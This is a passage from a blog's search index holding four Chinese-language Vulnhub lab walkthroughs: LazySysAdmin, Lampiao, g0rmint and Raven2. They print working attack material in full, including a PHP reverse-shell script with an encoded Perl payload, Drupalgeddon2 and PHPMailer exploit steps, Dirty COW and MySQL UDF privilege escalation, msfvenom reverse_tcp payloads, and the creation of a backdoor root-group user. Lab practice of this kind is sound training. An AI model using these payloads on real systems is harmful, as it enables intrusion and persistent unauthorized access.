<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[LazySysAdmin渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2FLazySysAdmin%2F</url>
    <content type="text"><![CDATA[前言直接使用VMware打开即可，使靶机与攻击机位于同一网段即可。 渗透测试主机发现（1）netdiscover netdiscover是基于ARP的网络扫描工具 ARP是将IP地址转化物理地址的网络协议。通过该协议，可以判断某个IP地址是否被使用，从而发现网络中存活的主机。Kali Linux提供的netdiscover工具，就是借助该协议实施主机发现。它既可以以被动模式嗅探存活的主机，也可以以主动模式扫描主机。用户还可以根据网络稳定性，调整发包速度和数量。 payload:netdiscover -r 192.168.64.0/24 （2）nmap payload:nmap -sP 192.168.64.0/24 端口扫描payload:nmap -A -oN /root/Desktop/Lazysysadmin_info.csv 192.168.64.143 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# Nmap 7.70 scan initiated Tue Jul 30 06:25:24 2019 as: nmap -A -oN /root/Desktop/Lazysysadmin_info.csv 192.168.64.143Nmap scan report for 192.168.64.143Host is up (0.00064s latency).Not shown: 994 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)| 2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)| 256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)|_ 256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)80/tcp open http Apache httpd 2.4.7 ((Ubuntu))|_http-generator: Silex v2.2.7| http-robots.txt: 4 disallowed entries |_/old/ /test/ /TR2/ /Backnode_files/|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: Backnode139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)3306/tcp open mysql MySQL (unauthorized)6667/tcp open irc InspIRCd| irc-info: | server: Admin.local| users: 1| servers: 1| chans: 0| lusers: 1| lservers: 0| source ident: nmap| source host: 192.168.64.131|_ error: Closing link: (nmap@192.168.64.131) [Client exited]MAC Address: 00:0C:29:DE:C8:B4 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -8d02h13m08s, deviation: 5h46m24s, median: -7d22h53m09s|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: lazysysadmin| NetBIOS computer name: LAZYSYSADMIN\x00| Domain name: \x00| FQDN: lazysysadmin|_ System time: 2019-07-22T21:32:29+10:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2019-07-22 07:32:29|_ start_date: N/ATRACEROUTEHOP RTT ADDRESS1 0.64 ms 192.168.64.143OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Jul 30 06:25:48 2019 -- 1 IP address (1 host up) scanned in 23.64 seconds 从中可看出： 22端口——ssh远程登录协议 80端口——http服务 139端口——NETBIOS Session Service端口,用于提供文件共享服务,主要用于企业内部网之间互相访问,如文件共享或打印等等. 445端口——有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机 3306端口——mysql服务 6667端口——一种透过网络的即时聊天方式。其主要用于群体聊天，但同样也可以用于个人对个人的聊天。 enum4linux扫描 Windows平台上曾经出现过一个第三方的信息枚举工具 enum.exe，其利用SMB协议枚举Windows系统和SAMBA服务，以此来获得目标系统大量的重要信息，其枚举结果可能包含目标系统的用户帐号、组帐号、共享目录、密码策略等机密重要信息。enum4linux作为其Linux平台的复刻作品，全面兼容了enum.exe的所有功能。对于安全防护不足的SMB/SAMBA服务，enum4linux可直接枚举重要信息，甚至帮助我们发现潜在漏洞的存在。 payload:enum4linux 192.168.64.143 获取到远程主机共享了print和share两个文件夹。 web目录扫描 可看出，主要web应用有phpMyAdmin和WordPress WPScan扫描参考文章：WPScan使用攻略 采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。 扫描WordPress站点:wpscan -u http://192.168.64.143/wordpress/ 仅获得服务器的基本信息（PHP版本、Apache以及系统的信息），并没有其他的插件，不存在漏洞利用点。 枚举WordPress用户：wpscan -u http://192.168.64.143/wordpress/ --enumerate u Web站点信息（1）togie可能是什么的账户名 （2）WPScan枚举出admin和ulgrmbcg两个用户名 Samba协议登录由上面enumlinux扫描获取到两个共享文件夹，访问: windows下:\\192.168.64.143\share$ linux下:smbclient //192.168.64.143/share$ 经简单审计WordPress的源码，发现信息： wp-config.php 1234567define('DB_NAME', 'wordpress');/** MySQL database username */define('DB_USER', 'Admin');/** MySQL database password */define('DB_PASSWORD', 'TogieMYSQL12345^^');/** MySQL hostname */define('DB_HOST', 'localhost'); 获得数据库的用户与密码，登录phpMyAdmin发现权限受限，无法利用。 deets.txt 123CBF Remembering all these passwords.Remember to remove this file and update your password after we push out the server.Password 12345 可能为某种服务的密码 SSH登录(方法1)尝试ssh togie@192.168.64.143 输入password:12345 togie权限很低，但是发现具有sudo权限 sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具 输入sudo su，成功提权…… web渗透(方法2)整理前面获取的信息: 未知的密码12345 未知的用户名togie 数据库的用户名Admin，密码TogieMYSQL12345^^ （1）WordPress后台登录:http://192.168.64.143/wordpress/wp-login.php 尝试用户名Admin，密码TogieMYSQL12345^^，登录成功，进入到WordPress后台 （2）点击插件-&gt;编辑-&gt;选择Hello Dolly Hello Dolly不是普通的插件，它象征着一代人希望和热情，浓缩成Louis Armstrong的四个字：你好，多莉。在启用后，在您站点后台每个页面的右上角都可以看到一句来自《俏红娘》音乐剧的英文原版台词 （3）修改hello.php文件，在末尾添加file_put_contents(‘shell.php’,’‘); 在当前目录下生成webshell，蚁剑连接即可 （4）上传反弹shell脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpfunction which($pr) &#123;$path = execute("which $pr");return ($path ? $path : $pr);&#125;function execute($cfe) &#123;$res = '';if ($cfe) &#123;if(function_exists('exec')) &#123;@exec($cfe,$res);$res = join("\n",$res);&#125; elseif(function_exists('shell_exec')) &#123;$res = @shell_exec($cfe);&#125; elseif(function_exists('system')) &#123;@ob_start();@system($cfe);$res = @ob_get_contents();@ob_end_clean();&#125; elseif(function_exists('passthru')) &#123;@ob_start();@passthru($cfe);$res = @ob_get_contents();@ob_end_clean();&#125; elseif(@is_resource($f = @popen($cfe,"r"))) &#123;$res = '';while(!@feof($f)) &#123;$res .= @fread($f,1024);&#125;@pclose($f);&#125;&#125;return $res;&#125;function cf($fname,$text)&#123;if($fp=@fopen($fname,'w')) &#123;@fputs($fp,@base64_decode($text));@fclose($fp);&#125;&#125;$yourip = "192.168.64.131"; //修改这里$yourport = "4444"; // 修改这里$usedb = array('perl'=&gt;'perl','c'=&gt;'c');$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"."aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"."hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"."sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"."kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"."KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"."OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";cf('/tmp/.bc',$back_connect);$res = execute(which('perl')." /tmp/.bc $yourip $yourport &amp;");?&gt; 访问后接受到shell 但经过尝试，如 python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; su togie 提示must be run from a terminal，没办法走方法2，从而使用方法1直接登陆ssh切换到管理员账号 参考文章 Vulnhub-LazySysAdmin 通关指南 带妹玩转Vulnhub【一】 Lazysysadmin渗透实战]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Lampiao渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2FLampiao%2F</url>
    <content type="text"><![CDATA[前言靶机难度不大 渗透测试信息收集 IP 端口 netdiscover -r 192.168.64.0/24 ​ namp -A -oN nmap.txt 192.168.64.146 123456789101112131415PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)| 2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)| 256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)|_ 256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (EdDSA)80/tcp open http?MAC Address: 00:0C:29:70:1E:63 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.8Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 访问80端口发现一个静态页面，且没有任何提示；怀疑开放了其他端口： nmap -sS -p 1-2000 192.168.64.146 -sS TCP SYN扫描 访问192.168.64.146:1898 web指纹 whatweb http://192.168.64.146:1898 根据网页下方版权亦可看出，站点CMS为Drupal web目录 获取会话（1）metasploit search Drupal 12use use exploit/unix/webapp/drupal_drupalgeddon2 options 1234set php_func systemset RHOSTS 192.168.64.146set rport 1898run GETSHELL msf的shell不是完整的shell，交互不完整； 恰好此处安装了python，可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生虚拟终端 12shellpython -c 'import pty; pty.spawn("/bin/bash")' 提权首先获取系统信息 123456789www-data@lampiao:~/html$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@lampiao:~/html$ uname -auname -aLinux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linuxwww-data@lampiao:~/html$ cat /proc/versioncat /proc/versionLinux version 4.4.0-31-generic (buildd@lgw01-01) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 其次审计web源码，是否能从中获取一些有用信息 打包web源码:tar -czvf web.tar.gz ../html Linux tar命令用于备份文件。 tar是用来建立，还原备份文件的工具程序，它可以加入，解开备份文件内的文件。 -c 新建打包文件，同 -v 一起使用 查看过程中打包文件名-z 通过gzip方式压缩或解压，最后以.tar.gz 为后缀-v 压缩或解压过程中，显示出来过程-f 后面接要处理的文件-x 解决文件， -C 解压到对应的文件目录-t 列出备份文件的内容。 ########################################################################## 压缩：tar -czvf web.tar.gz ../html 解压：tar -xzvf web.tar.gz 列出压缩文件内容：tar -tzvf test.tar.gz WEB源码目录： 其中有用的信息: qrc.png =&gt;二维码 （加油信息） audio.m4a =&gt;音频信息 （user:tiago） /sites/default/settings.php =&gt;web配置文件 其中settins.php: 123456789101112131415$databases = array ( 'default' =&gt; array ( 'default' =&gt; array ( 'database' =&gt; 'drupal', 'username' =&gt; 'drupaluser', 'password' =&gt; 'Virgulino', 'host' =&gt; 'localhost', 'port' =&gt; '', 'driver' =&gt; 'mysql', 'prefix' =&gt; '', ), ),); 此处使用该账号信息进入到mysql，从user表中获取到Linux的账号信息 ps：此处应该可以尝试暴力破解，但加了salt很难破解，需要通过工具字典爆。 但通过网络教程来看，用户tiago的密码恰好为Virgulino，通过ssh登录成功。 通过脏牛提权 CVE-2016-5195 脏牛（Dirty COW） Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。 wget https://www.exploit-db.com/download/40847 12mv 40847 40847.cppg++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil 至此提权成功，获取到flag~ 总结记录下渗透过程传输文件的技巧 Linux系统之间传递文件:scp scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令，因此需要开启ssh服务 从本地传送到远程服务器 1.1传递文件 12scp local_file remote_username@remote_ip:remote_folder #不改变文件名scp local_file remote_username@remote_ip:remote_file #改变文件名 例:scp /root/Desktop/Lampiao/ test.php xm@192.168.64.128:/home/xm/桌面/test.php 1.2传递文件夹 1scp -r local_folder remote_username@remote_ip:remote_folder 例:scp -r /root/Desktop/Lampiao/ xm@192.168.64.128:/home/xm/桌面/ 从远程服务器传送到本地 顺序同上面相反 例： 12scp root@www.runoob.com:/home/root/others/music /home/space/music/1.mp3 scp -r www.runoob.com:/home/root/others/ /home/space/music/ wget 在攻击方服务器上开启web服务，将需要的文件放入web目录下，在靶机上相应目录wget下载下来即可。 参考文章 Linux tar命令 Linux scp命令 vulnhub|渗透测试lampiao 【漏洞预警】CVE-2016-5195 脏牛漏洞：Linux内核通杀提权漏洞（10.27 10:30更新）]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[g0rmint渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2Fg0rmint%2F</url>
    <content type="text"><![CDATA[前言这里自动设置的是桥接，记得修改为NAT 靶机难度不大，但是十分狗血，莫名其妙的问题一大堆 渗透测试主机发现netdiscover:netdiscover -r 192.168.64.0/24 端口扫描 仅开放22与80端口，看样子需要从web层面进行渗透 Web信息收集（1）目录扫描 扫描器发现，网站根目录下存在robots.txt，打开提示/g0rmint/ 继续使用扫描器发现：login.php 介绍kali下的目录扫描工具:dirb dirb http://........... （2）页面信息 经过尝试并没有发现漏洞点，查看源码，发现一段提示: 这里相当无语，我的靶机里并没有这一行代码，但网络上的教程中是显示有的 访问后仍然404，但用扫描器发现了一些信息 dirb http://192.168.64.144/g0rmint/s3cretbackupdirect0ry/ 访问info.php，得到信息：backup.zip；成功下载获取源码 代码审计 想着登录到后台，从db.sql中找到了一条信息 1INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES (1, 'demo', 'demo@example.com', 'fe01ce2a7fbac8fafaed7c982a04e229');` MD5解密=&gt;demo 但是发现无法登录，可能是该信息是最原始的密码。 查看reset.php: 密码是截取gmdate()函数生成的日期的前20位，再先后加密得到的 而修改密码需要提供账户名和邮箱名，使用db.sql中的信息失败 经网上教程提醒，全局搜索email，在某个css文件中查找到了这条信息： 修改登录，最终成功登录进入后台： getshell发现后台并没有什么利用点，继续审查代码 在login.php中可以看到 1234567891011121314151617181920212223&lt;?phpinclude_once('config.php');if (isset($_POST['submit'])) &#123; // If form is submitted $email = $_POST['email']; $pass = md5($_POST['pass']); $sql = $pdo-&gt;prepare("SELECT * FROM g0rmint WHERE email = :email AND pass = :pass"); $sql-&gt;bindParam(":email", $email); $sql-&gt;bindParam(":pass", $pass); $row = $sql-&gt;execute(); $result = $sql-&gt;fetch(PDO::FETCH_ASSOC); if (count($result) &gt; 1) &#123; session_start(); $_SESSION['username'] = $result['username']; header('Location: index.php'); exit(); &#125; else &#123; $log = $email; $reason = "Failed login attempt detected with email: "; addlog($log, $reason); &#125;&#125;?&gt; 其中addlog()定义位于config.php: 1234567891011121314function addlog($log, $reason) &#123; $myFile = "s3cr3t-dir3ct0ry-f0r-l0gs/" . date("Y-m-d") . ".php"; if (file_exists($myFile)) &#123; $fh = fopen($myFile, 'a'); fwrite($fh, $reason . $log . "&lt;br&gt;\n"); &#125; else &#123; $fh = fopen($myFile, 'w'); fwrite($fh, file_get_contents("dummy.php") . "&lt;br&gt;\n"); fclose($fh); $fh = fopen($myFile, 'a'); fwrite($fh, $reason . $log . "&lt;br&gt;\n"); &#125; fclose($fh);&#125; 可见，当登录失败时，email信息将会被写入到php文件中，即可写入一句话，成功获取webshell 提权查看系统信息 12uname -acat /proc/version 版本信息为：Ubuntu 16.04，存在一种本地提权的方法 参考文章： Ubuntu16.04 本地提权漏洞复测过程 【漏洞复现】Ubuntu本地提权漏洞CVE-2017-16995 这里又是一个坑点，我无论用何种exp，都会提醒各种错误，这个过程花了一个上午，最终还不知道是怎么成功的…但不管怎么说，这几种exp在webshell的虚拟终端是无法执行成功的，需要反弹shell 反弹shell此处给出本例使用过的两种通过metasploit反弹的方式 二进制文件 1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf 123456msfconsoleuse exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset lhost 192.168.64.131set lport 4444exploit PHP文件 1msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php 12345use exploit/multi/handlerset payload php/meterpreter_reverse_tcpset lhost 192.168.64.131set lport 4444exploit 由于目标服务器没有gcc，于是在本地Linux系统中生成exp： 1gcc -c exp.c -o exp 将exp上传至目标服务器中，在msf shell中执行，成功提权： 在/root/目录下获取到flag 至此，渗透实验基本完成。 我这里额外添加了一个普通用户，并将它加入到管理员和sudo组 12345useradd hackerpasswd hackerusermod -s /bin/bash hackerusermod -g root hackerusermod -aG sudo hacker 这里因为在msf shell中，不能顺利的修改文件，这里没有完全将普通用户提升为root权限。 12id hackeruid=1001(hacker) gid=0(root) groups=0(root),27(sudo) 杂记 这个靶机因为提权exp的问题耗费了太多的时间精力，还专门去下了一个相同版本的Ubuntu来gcc编译，然后……生成的exp仍然不行 但这个过程中利用到了更换Linux内核，有必要在这里记录一下 uname -r 查看系统默认内核 apt-cache search linux 查看可获取的内核 sudo apt-get install linux-headers-4.4.0-62-generic linux-image-4.4.0-62-generic 安装所需要版本的内核，注意:这一步需要下载两个东西，”headers”和”image”，不能只安装其中一个 sudo gedit /boot/grub/grub.cfg 修改内核配置信息 保存后重启即可 参考文章: 【漏洞复现】Ubuntu本地提权漏洞CVE-2017-16995 ubuntu如何安装或更换内核 Ubuntu下更换内核详细步骤（亲测有效） 参考文章 记一次在实战靶机中使用SearchSploit的总结 Vulnhub-g0rmint 带妹玩转Vulnhub【二】 msf生成常用payload 记一次在实战靶机中使用SearchSploit的总结]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Raven2渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2FRaven2%2F</url>
    <content type="text"><![CDATA[前言 难度中等，主要是想练习一下mysql udf提权，同时靶机也涉及了phpmailer的漏洞 渗透信息收集netdiscover -r 192.168.64.0/24 =&gt; 192.168.64.148 nmap -oN nmap.txt -A 192.168.64.148 123456789101112131415161718192021222324PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey: | 1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)| 2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)| 256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)|_ 256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Raven Security111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100024 1 48650/tcp status|_ 100024 1 53215/udp statusMAC Address: 00:0C:29:B2:C8:AD (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel dirb 192.168.64.148 =&gt; /vendor/ /wordpress/ 其中wordpress无法正常打开，vendor存在目录遍历，并发现phpmailer 5.2.16，存在漏洞 GETSHELLmsf：searchsploit phpmailer 选择python那个脚本，修改exp配置： 修改target为靶机的ip，利用文件为/contact.php 修改后门文件路径，默认的用不了 修改反弹shell的ip与端口 这里当然可以手工利用，抓包并向contact.php文件post数据： 1234567891011121314POST /contact.php HTTP/1.1Host: 192.168.64.148Content-Length: 153Accept: text/html, */*; q=0.01Origin: http://192.168.64.148X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://192.168.64.148/contact.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeaction=submit&amp;name=&lt;?php phpinfo();?&gt;&amp;email="anarcoder\" -OQueueDirectory=/tmp -X/var/www/html/test.php server" @protonmail.com&amp;subject=123&amp;message=Pwned 提交或执行后，在kali上成功获取到反弹的shell，再使用python创建一个虚拟终端： python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; udf提权发现存在mysql进程，尝试udf提权： 先在kali中下载exp并编译下来： 1234wget https://www.exploit-db.com/download/1518#下载expmv ./1518 ./1518.c gcc -g -c 1518.cgcc -g -shared -o raptor_udf.so 1518.o -lc 在kali下开启Apache服务：/etc/init.d/apache2 start 将编译器下来的raptor_udf.so移动到/html/，在目标服务器/tmp下执行wget http://192.168.64.131:8080/raptor_udf.so 目标服务器下/usr/lib/mysql/plugin中不具备权限，无法直接将文件直接拷贝到该文件夹中，需要进入数据库中操作，在数据库中导入和导出文件： 12345678910111213141516171819202122232425262728293031323334353637mysql&gt; use mysql;mysql&gt; create table foo(data blob);create table foo(data blob);Query OK, 0 rows affected (0.04 sec)mysql&gt; insert into foo values(load_file(&apos;/tmp/raptor_udf.so&apos;));insert into foo values(load_file(&apos;/tmp/raptor_udf.so&apos;));Query OK, 1 row affected (0.02 sec)mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf.so&apos;;select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf.so&apos;;Query OK, 1 row affected (0.01 sec)mysql&gt; create function do_system returns string soname &apos;raptor_udf.so&apos;;create function do_system returns string soname &apos;raptor_udf.so&apos;;Query OK, 0 rows affected (0.01 sec)mysql&gt; select * from mysql.func;select * from mysql.func;+-----------+-----+---------------+----------+| name | ret | dl | type |+-----------+-----+---------------+----------+| do_system | 0 | raptor_udf.so | function |+-----------+-----+---------------+----------+1 row in set (0.00 sec)mysql&gt; select do_system(&apos;chmod u+s /usr/bin/find&apos;);select do_system(&apos;chmod u+s /usr/bin/find&apos;);+--------------------------------------+| do_system(&apos;chmod u+s /usr/bin/find&apos;) |+--------------------------------------+| NULL |+--------------------------------------+1 row in set (0.01 sec) 命令执行： 123touch foofind foo -exec 'whoami' \;find foo -exec '/bin/sh' \; 参考文章 Web安全 — CVE-2016-10033漏洞（phpmailer任意代码执行） Raven2渗透实战 MySQL 4.x / 5.0（Linux） - 用户定义函数（UDF）动态库]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
</search>
